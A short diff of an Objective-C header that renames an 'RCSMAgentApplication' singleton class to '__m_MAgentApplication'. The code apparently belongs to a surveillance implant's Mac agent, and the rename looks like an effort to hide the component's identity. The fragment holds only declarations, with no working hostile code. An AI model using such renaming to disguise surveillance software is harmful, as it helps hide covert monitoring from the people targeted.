@@ -16,7 +16,7 @@
 //  char *delim;
 //} appStruct;
 
-@interface RCSMAgentApplication : NSObject 
+@interface __m_MAgentApplication : NSObject 
 {
   BOOL      isAppStarted;
   NSString *mProcessName;
@@ -27,7 +27,7 @@
 
 @property (readwrite) BOOL isAppStarted;
 
-+ (RCSMAgentApplication *)sharedInstance;
++ (__m_MAgentApplication *)sharedInstance;
 + (id)allocWithZone: (NSZone *)aZone;
 - (id)copyWithZone: (NSZone *)aZone;
 - (id)retain;
